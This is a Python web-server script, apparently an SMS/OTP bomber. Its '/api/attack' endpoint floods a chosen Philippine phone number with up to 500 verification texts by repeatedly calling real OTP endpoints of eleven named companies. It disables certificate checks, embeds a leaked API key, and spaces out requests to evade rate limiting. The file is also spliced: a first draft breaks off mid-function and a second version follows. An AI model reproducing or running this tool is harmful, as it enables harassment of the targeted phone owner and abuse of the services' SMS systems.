from http.server import BaseHTTPRequestHandler
import json
import random
import urllib.request
import urllib.parse
import ssl

# Bypass SSL
ssl._create_default_https_context = ssl._create_unverified_context

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/attack':
            self.handle_attack()
        else:
            self.send_error(404)
    
    def send_otp(self, service, phone):
        try:
            intl_phone = "+63" + phone[1:]
            
            if service == "EZLOAN":
                data = json.dumps({
                    "businessId": "EZLOAN", 
                    "contactNumber": phone[1:]
                }).encode()
                req = urllib.request.Request(
                    "https://gateway.ezloancash.ph/security/auth/otp/request",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "XPRESS":
                data = json.dumps({
                    "Phone": intl_phone,
                    "Email": f"user{random.randint(1000,9999)}@gmail.com",
                    "Password": "Pass1234!",
                    "FingerprintVisitorId": "TPt0yCuOFim3N3rzvrL1",
                    "FingerprintRequestId": "1757149666261.Rr1VvG"
                }).encode()
                req = urllib.request.Request(
                    "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "ABENSON":
                data = urllib.parse.urlencode({
                    "contact_no": phone[1:]
                }).encode()
                req = urllib.request.Request(
                    "https://api.mobile.abenson.com/api/public/membership/activate_otp",
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "EXCELLENT_LENDING":
                data = json.dumps({
                    "domain": phone[1:],
                    "cat": "login",
                    "previous": False,
                    "financial": "efe35521e51f924efcad5d61d61072a9"
                }).encode()
                req = urllib.request.Request(
                    "https://api.excellenteralending.com/dllin/union/rehabilitation/dock",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "FORTUNE_PAY":
                data = json.dumps({
                    "dialCode": "+63",
                    "phoneNumber": phone[1:]
                }).encode()
                req = urllib.request.Request(
                    "https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "WEMOVE":
                data = json.dumps({
                    "phone_country": "+63",
                    "phone_no": phone[1:]
                }).encode()
                req = urllib.request.Request(
                    "https://api.wemove.com.ph/auth/users",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "LBC":
                data = urllib.parse.urlencode({
                    "client_contact_no": phone[1:],
                    "client_contact_code": "+63"
                }).encode()
                req = urllib.request.Request(
                    "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "PICKUP_COFFEE":
                data = json.dumps({
                    "mobile_number": intl_phone
                }).encode()
                req = urllib.request.Request(
                    "https://production.api.pickup-coffee.net/v2/customers/login",
                    data=data,
from http.server import BaseHTTPRequestHandler
import json
import random
import urllib.request
import urllib.parse
import ssl
import time

# Bypass SSL
ssl._create_default_https_context = ssl._create_unverified_context

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/attack':
            self.handle_attack()
        else:
            self.send_error(404)
    
    def send_otp(self, service, phone):
        try:
            intl_phone = "+63" + phone[1:]
            
            if service == "EZLOAN":
                data = json.dumps({
                    "businessId": "EZLOAN", 
                    "contactNumber": phone[1:]
                }).encode()
                req = urllib.request.Request(
                    "https://gateway.ezloancash.ph/security/auth/otp/request",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                response = urllib.request.urlopen(req, timeout=8)
                return response.getcode() in [200, 201]
                
            elif service == "XPRESS":
                data = json.dumps({
                    "Phone": intl_phone,
                    "Email": f"user{random.randint(1000,9999)}@gmail.com",
                    "Password": "Pass1234!",
                    "FingerprintVisitorId": "TPt0yCuOFim3N3rzvrL1",
                    "FingerprintRequestId": "1757149666261.Rr1VvG"
                }).encode()
                req = urllib.request.Request(
                    "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                response = urllib.request.urlopen(req, timeout=8)
                return response.getcode() in [200, 201]
                
            elif service == "ABENSON":
                data = urllib.parse.urlencode({
                    "contact_no": phone[1:]
                }).encode()
                req = urllib.request.Request(
                    "https://api.mobile.abenson.com/api/public/membership/activate_otp",
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                response = urllib.request.urlopen(req, timeout=8)
                return response.getcode() in [200, 201]
                
            elif service == "EXCELLENT_LENDING":
                data = json.dumps({
                    "domain": phone[1:],
                    "cat": "login",
                    "previous": False,
                    "financial": "efe35521e51f924efcad5d61d61072a9"
                }).encode()
                req = urllib.request.Request(
                    "https://api.excellenteralending.com/dllin/union/rehabilitation/dock",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                response = urllib.request.urlopen(req, timeout=8)
                return response.getcode() in [200, 201]
                
            elif service == "FORTUNE_PAY":
                data = json.dumps({
                    "dialCode": "+63",
                    "phoneNumber": phone[1:]
                }).encode()
                req = urllib.request.Request(
                    "https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                response = urllib.request.urlopen(req, timeout=8)
                return response.getcode() in [200, 201]
                
            elif service == "WEMOVE":
                data = json.dumps({
                    "phone_country": "+63",
                    "phone_no": phone[1:]
                }).encode()
                req = urllib.request.Request(
                    "https://api.wemove.com.ph/auth/users",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                response = urllib.request.urlopen(req, timeout=8)
                return response.getcode() in [200, 201]
                
            elif service == "LBC":
                data = urllib.parse.urlencode({
                    "client_contact_no": phone[1:],
                    "client_contact_code": "+63"
                }).encode()
                req = urllib.request.Request(
                    "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                response = urllib.request.urlopen(req, timeout=8)
                return response.getcode() in [200, 201]
                
            elif service == "PICKUP_COFFEE":
                data = json.dumps({
                    "mobile_number": intl_phone
                }).encode()
                req = urllib.request.Request(
                    "https://production.api.pickup-coffee.net/v2/customers/login",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                response = urllib.request.urlopen(req, timeout=8)
                return response.getcode() in [200, 201]
                
            elif service == "HONEY_LOAN":
                data = json.dumps({
                    "phone": phone[1:]
                }).encode()
                req = urllib.request.Request(
                    "https://api.honeyloan.ph/api/client/registration/step-one",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                response = urllib.request.urlopen(req, timeout=8)
                return response.getcode() in [200, 201]
                
            elif service == "KOMO_PH":
                data = json.dumps({
                    "mobile": phone[1:]
                }).encode()
                req = urllib.request.Request(
                    "https://api.komo.ph/api/otp/v5/generate",
                    data=data,
                    headers={
                        'Content-Type': 'application/json',
                        'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
                    }
                )
                response = urllib.request.urlopen(req, timeout=8)
                return response.getcode() in [200, 201]
                
            elif service == "S5_OTP":
                data = f"phone_number={intl_phone}".encode()
                req = urllib.request.Request(
                    "https://api.s5.com/player/api/v1/otp/request",
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                response = urllib.request.urlopen(req, timeout=8)
                return response.getcode() in [200, 201]
                
        except Exception as e:
            print(f"Service {service} failed: {str(e)}")
            return False

    def handle_attack(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            target = data.get('target', '').strip()
            sms_count = int(data.get('sms', 100))
            
            if not target or len(target) != 11 or not target.startswith('09'):
                self.send_response(400)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "error": "❌ Invalid number format"
                }).encode())
                return
            
            if sms_count < 1 or sms_count > 500:
                self.send_response(400)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "error": "❌ SMS count must be 1-500"
                }).encode())
                return
            
            # OTP SERVICES
            services = [
                "EZLOAN", "XPRESS", "ABENSON", "EXCELLENT_LENDING", 
                "FORTUNE_PAY", "WEMOVE", "LBC", "PICKUP_COFFEE", 
                "HONEY_LOAN", "KOMO_PH", "S5_OTP"
            ]
            
            # Send ALL requests to REAL services (no simulation)
            success = 0
            failed = 0
            total_requests = 0
            
            # Process in batches to avoid timeout
            batch_size = 11  # One batch = all 11 services
            total_batches = (sms_count + batch_size - 1) // batch_size
            
            for batch in range(total_batches):
                batch_services = services.copy()
                random.shuffle(batch_services)  # Shuffle services each batch
                
                for service in batch_services:
                    if total_requests >= sms_count:
                        break
                        
                    if self.send_otp(service, target):
                        success += 1
                        print(f"✅ {service} - SUCCESS")
                    else:
                        failed += 1
                        print(f"❌ {service} - FAILED")
                    
                    total_requests += 1
                    
                    # Small delay between requests to avoid rate limiting
                    time.sleep(0.5)
                
                # Delay between batches
                if batch < total_batches - 1:
                    time.sleep(1)
            
            response_data = {
                "success": success,
                "failed": failed,
                "total": success + failed,
                "message": f"✅ OTP Attack Complete! {success} successful, {failed} failed"
            }
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(response_data).encode())
            
        except Exception as e:
            print(f"Server error: {str(e)}")
            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({
                "error": f"Server error: {str(e)}"
            }).encode())
